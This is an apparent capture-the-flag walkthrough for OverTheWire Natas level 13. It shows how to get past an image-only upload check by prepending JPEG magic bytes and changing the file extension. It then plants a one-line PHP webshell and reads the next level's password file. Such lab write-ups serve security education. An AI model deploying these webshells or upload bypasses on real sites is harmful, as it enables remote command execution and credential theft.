![natas13_01.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_01.png)

This time we will be greeted with a similar page but a new message letting us know that the form only accepts image files now.

![natas13_02.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_02.png)

The code hasn't changed much from the previous level. However, the `exif` conditional is new (Exif data is basically metadata, you can read more about it [here](https://en.wikipedia.org/wiki/Exif) and [here](https://www.adobe.com/au/creativecloud/file-types/image/raster/exif-file.html)).

![natas13_03.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_03.png)

The question we want to know the answer to is: Can we trick this form to accept a `php` file?

First, how do we determine the type of a file? 

This is done through `file signatures` or `magic numbers`. These are the first few bytes at the start of a file.

![natas13_04.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_04.png)

When creating a new file it defaults as empty and it recognizes that we placed ASCII text inside it when we do so. What if we change the `file signature`?

Gary Kessler has maintained a large list of file signatures that you can find [here](https://www.garykessler.net/library/file_sigs.html). Let's look for the signature of a `jpg` file.

![natas13_05.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_05.png)

The first four hexadecimal values are the file signature, what comes after isn't necessary for our current use case so, we'll only deal with these first four bytes for now.

If we open up the file in `hexeditor` or some other `hexdump` editor we can add these values to the start of the file. To add and delete bytes in `hexeditor` we can open the file like this: `hexeditor -b new_file`.

![natas13_06.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_06.png)

Using `Ctrl+a` we can add bytes from the location of the cursor.

![natas13_07.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_07.png)

Now, we can add the signature we found with an extra null byte at the end - to separate the signature from the file data (or payload).

![natas13_08.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_08.png)

Let's save and check the file's type.

![natas13_09.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_09.png)

Cool! Now it thinks our file is an image. 

Let's manipulate the file from the previous level to render the output of the `phpinfo()` function to the page.

![natas13_10.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_10.png)

Instead of using `burpsuite` this time, remember when I mentioned that `inspector` can be used with misconfigured sites as a vector to pull off attacks? In this case, we'll just change the file extension through `inspect element`.

First, add the file so it's ready to be uploaded and open `inspect element`. Find where the filename value has been calculated and change the extension to `php`. You could just change the whole filename too if you'd like but, remember that the `php` code changes the filename anyway so only the extension matters here.

![natas13_11.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_11.png)

Upload success!

![natas13_12.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_12.png)

PHP execution success! Note the question marks, that's the file signature. `PHP` doesn't know how to handle that but, that's ok!

![natas13_13.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_13.png)

Now we have two options, we can use `system` again, or we could use a `webshell`. The `webshell` will allow us to make subsequent request to the machine by using a parameter that we can set by using the `php` super global variable: `$_GET`.

```php
<?php system($_GET['cmd']); ?>
```

Once the file is uploaded, this allows us to specify commands in the `URL` like this:

```
upload/filename.php?cmd=<command>
```

Let's create the file.

![natas13_14.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_14.png)

Prepare to upload the file.

![natas13_15.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_15.png)

Upload.

![natas13_16.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_16.png)

Now, access the file.

![natas13_17.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_17.png)

Notice that the error mentions that system cannot run because of a `blank command`. Let's give it one to run by appending: `?cmd=cat /etc/natas_webpass/natas14`.
 
To explain, `?` is the `URL` parameter indicator. This means that the next word will be an argument to the script. Because we specified `cmd` with `$_GET`, our script will execute whatever command we give to the `cmd` parameter through the `system` function. It essentially functions like a terminal session (although much more limited), however, seeing as it's commands are performed through a website (not directly on the command line) we call it a `webshell`.

![natas13_18.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_18.png)

If we wanted to, we could also have surrounded the `php` with the `<pre></pre>` tags. Which would make the readout much cleaner.

```php
<pre>
	<?php system($_GET['bloop']); ?>
</pre>
```

![natas13_19.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_19.png)

The `<pre>` tags will also format an output for something like `ls -lah` in a nice, clean and predictable format. Otherwise, it'll be a complete mess and a headache to parse.

For example:

![natas13_20.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_20.png)

versus

![natas13_21.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_21.png)

---

# The Python Way

There is always a way with `python`.

![natas13_22.png](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/overthewire/natas/images/natas13_22.png)
